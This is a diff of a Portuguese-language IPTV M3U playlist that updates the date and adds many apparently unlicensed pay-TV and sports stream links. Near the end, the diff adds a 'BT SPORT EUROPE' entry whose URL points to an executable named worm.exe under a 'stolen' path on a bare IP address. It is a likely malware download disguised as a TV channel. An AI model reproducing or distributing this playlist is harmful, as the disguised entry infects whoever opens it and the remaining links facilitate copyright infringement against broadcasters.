@@ -1,6 +1,6 @@
 #EXTM3U
 
-#EXTINF:-1,[COLOR green] [COLOR white][B] [COLOR red]|||[/COLOR] Update 19-12-15 [COLOR red]|||[/COLOR][/B][/COLOR]
+#EXTINF:-1,[COLOR green] [COLOR white][B] [COLOR red]|||[/COLOR] Update 20-12-15 [COLOR red]|||[/COLOR][/B][/COLOR]
 http://jerrymoz.wordpress.com
 #EXTINF:-1,[COLOR green][COLOR yellow][B]Links available in search free on the Internet I am not responsible for your use [COLOR red]||[/COLOR] Links Disponiveis em pesquisa livre na Internet nao me responsabilizo pelo uso dos mesmos[/B][/COLOR]
 http://jerrymoz.wordpress.com
@@ -25,7 +25,7 @@ http://31.204.128.112:8081/live/portugal1/playlist.m3u8
 http://127.0.0.1:6878/ace/getstream?id=c39db61fd585ebfa446983d0af9d9d637df9678c&hlc=1&spv=0&transcode_audio=0&transcode_mp3=0&preferred_audio_language=eng
 #EXTINF:-1 group-title="DESPORTO",[COLOR mediumslateblue]SPORT TV1[/COLOR] (se ñ tiver seeds ñ funciona)
 http://127.0.0.1:6878/ace/getstream?id=ef6c2b73a0436e06478790e7f8f27f173159dd59&hlc=1&spv=0&transcode_audio=0&transcode_mp3=0&preferred_audio_language=eng
-#EXTINF:-1 group-title="DESPORTO",[COLOR green]SPORTV 1[/COLOR] (VLC)
+#EXTINF:-1 group-title="DESPORTO",[COLOR mediumslateblue]SPORTV 1[/COLOR] (VLC)
 http://127.0.0.1:6878/ace/getstream?url=http%3A%2F%2Fcontent.asplaylist.net%2FbUhkdzNLNXRVSEd6VjAyYnFsYW5MWHp5VnlZb1VkbkxiUVJRUUpsMUl6RlVzTEFyUkl1Y2tLN2pCbmtBRDVWdElESFBWa0FwNTgwVnlzY1hUaWxpbmc9PQ%2F10480.acelive&hlc=1&spv=0&transcode_audio=0&transcode_mp3=0&preferred_audio_language=eng
 #EXTINF:-1 group-title="DESPORTO",[COLOR green]SPORTV 1[/COLOR] (rtmp)
 rtmp://5.153.233.106:443/share/ playpath=live1-rbi6c swfUrl=http://sharecast.to/player/player20.swf live=1 timeout=13 pageUrl=http://sharecast.to/
@@ -42,6 +42,35 @@ http://jerrymoz.wordpress.com
 ####################################################################################################################################
 #EXTINF:-1,[COLOR white][B][COLOR red]||[/COLOR]SE PRETENDEREM CANAIS + ESTAVEIS [COLOR red]||[/COLOR][/B][/COLOR]
 http://jerrymoz.wordpress.com
+
+#EXTINF:-1,Por: TVCINE 1
+http://bstream.starsplanet.org:8000/live/monic/monic/3372.m3u8
+#EXTINF:-1,Por: TVCINE 2
+http://bstream.starsplanet.org:8000/live/monic/monic/3371.m3u8
+#EXTINF:-1,Por: TVCINE 3
+http://bstream.starsplanet.org:8000/live/monic/monic/3370.m3u8
+#EXTINF:-1,Por: TVCINE 4
+http://bstream.starsplanet.org:8000/live/monic/monic/3369.m3u8
+#EXTINF:-1,Por: SYFY
+http://bstream.starsplanet.org:8000/live/monic/monic/3373.m3u8
+#EXTINF:-1,Por: SIC Radical
+http://bstream.starsplanet.org:8000/live/monic/monic/3374.m3u8
+#EXTINF:-1,Por: SIC NOTICIAS
+http://bstream.starsplanet.org:8000/live/monic/monic/3375.m3u8
+#EXTINF:-1,Por: ODISSEIA
+http://bstream.starsplanet.org:8000/live/monic/monic/3379.m3u8
+#EXTINF:-1,Por: NICKELODEON
+http://bstream.starsplanet.org:8000/live/monic/monic/3380.m3u8
+#EXTINF:-1,Por: NATIONAL GEOGRAPHIC HD
+http://bstream.starsplanet.org:8000/live/monic/monic/3381.m3u8
+#EXTINF:-1,Por: DISNEY JUNIOR (test)
+http://bstream.starsplanet.org:8000/live/monic/monic/3384.m3u8
+#EXTINF:-1,POR - Sport Tv 4
+http://bstream.starsplanet.org:8000/live/monic/monic/2704.m3u8
+#EXTINF:-1,Sky Sports 4 Uk
+http://bstream.starsplanet.org:8000/live/monic/monic/1596.m3u8
+#EXTINF:-1,Por: BENFICA TV 2
+http://bstream.starsplanet.org:8000/live/monic/monic/3388.m3u8
 
 #EXTINF:-1,[COLOR green]BENFICA TV1 [COLOR red] (SE PRETENDER ESTE CANAL)[/COLOR][/COLOR]  envie um email
 http://selling-team.net:8000/live/castiglione/castiglione/6034.m3u8
@@ -466,10 +495,8 @@ http://3.hls.bolshoe.tv/1/streaming/boets/tvrec/playlist.m3u8
 #EXTINF:-1,[COLOR green]FIGHTER HQ[/COLOR]
 http://87.248.160.8/edge/smil:boet/playlist.m3u8
 
-#EXTINF:-1 group-title="DESPORTO",[COLOR green]BEIN SPORTS 1[/COLOR] HD
-http://mu0bxrc27iyr1u0.stream.iseehd.xyz/938/7598/53661b132b3ce37a58ad657bfea1020585652703
-#EXTINF:-1 group-title="DESPORTO",[COLOR green]BEIN SPORTS 2[/COLOR] HD
-http://mu0bxrc27iyr1u0.stream.iseehd.xyz/939/7598/53661b132b3ce37a58ad657bfea1020585652703
+#EXTINF:-1,BT SPORT EUROPE
+http://91.204.214.106:23101/stolen/057c/worm.exe
 
 #############################################################################################
 #EXTINF:-1,[COLOR green]Motores Tv[/COLOR] (uk) (rtmp)
